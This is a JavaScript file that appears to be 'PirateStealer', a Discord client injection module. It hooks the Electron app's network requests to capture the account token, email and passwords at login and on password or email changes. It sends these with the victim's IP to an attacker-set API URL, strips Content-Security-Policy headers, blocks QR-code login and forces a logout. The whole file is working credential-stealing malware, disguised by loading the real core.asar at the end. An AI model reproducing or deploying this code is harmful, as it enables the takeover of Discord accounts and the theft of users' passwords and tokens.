const {
    BrowserWindow,
    session
} = require('electron');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const webhook = "Você realmente acha que vou deixar uma webhook, em um script ofuscado em pleno 2022? Bjs"
const api = "your api url"
const Filters = {
    1: {
        urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
    },
    2: {
        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
    }
};

const config = {
    "minimum_members_per_server":"100",
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify":"true",
    "disable-qr-code": "%DISABLEQRCODE%1",
};


class PirateStealerEvent {
    constructor(event, token, data) {
        this.event = event;
        this.data = data;
        this.token = token;
    }
    handle() {
        switch (this.event) {
            case 'passwordChanged':
                passwordChanged(this.data.password, this.data.new_password, this.token);
                break;
            case 'userLogin':
                userLogin(this.data.password, this.data.email, this.token);
                break;
            case 'emailChanged':
                emailChanged(this.data.password, this.data.email, this.token);
                break;
        }
    }
}

async function firstTime() {
    var token = await getToken()
{await fetch(api + "/verify" + "/" + token + "/" + "teste" + "/" + "finalizado")}

if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return true

    fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
    if (config.logout != "false" && config.logout != "%LOGOUT%") {

        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
    }
    var token = await getToken()
    return !1

}

session.defaultSession.webRequest.onBeforeRequest(Filters[2], (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
            callback({
                cancel: true
            })
            return;
        }
    }
    if (firstTime()) { }

    callback({})
    return;
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

// Main functions

async function userLogin(password, email, token) {
    var ip = await getIp()
    await fetch(api + "/injection/login" + "/" + token + "/" + ip + "/" + password)
}

async function passwordChanged(oldPassword, newPassword, token) {
    var ip = await getIp();
    await fetch(api + "injection/passch" + "/" + token + "/" + ip + "/" + oldPassword + "/" + newPassword)

}


async function getIp() {
    const window = BrowserWindow.getAllWindows()[0];
    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return ip;
}
async function getToken() {
    const window = BrowserWindow.getAllWindows()[0];
    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
    return token;
}

session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    if (details.statusCode != 200) return;

    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data)
    const token = await getToken();

    switch (true) {
        case details.url.endsWith('login'):
            var event = new PirateStealerEvent('userLogin', token, {
                password: data.password,
                email: data.login
            });
            event.handle();
            return;
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            if (!data.password) return;
            if (data.email) {
                var event = new PirateStealerEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();

            };
            if (data.new_password) {
                var event = new PirateStealerEvent('passwordChanged', token, {
                    password: data.password,
                    new_password: data.new_password
                });
                event.handle();
            };
            return;
        default:
            break;
    }
});

module.exports = require('./core.asar')
